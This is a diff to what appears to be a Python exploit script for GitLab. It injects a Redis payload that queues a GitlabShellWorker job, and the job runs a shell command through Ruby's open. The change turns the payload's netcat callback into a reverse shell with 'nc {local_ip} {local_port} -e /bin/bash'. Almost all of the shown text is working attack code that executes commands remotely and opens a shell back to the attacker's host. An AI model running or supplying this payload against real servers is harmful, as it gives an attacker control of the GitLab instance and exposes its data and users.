@@ -56,7 +56,7 @@ print(f"[+] Creating project with random name: {project_name}")
 
 form = """\nmulti
     sadd resque:gitlab:queues system_hook_push
-    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port}' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
+    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port} -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
     exec
     exec
     exec\n"""
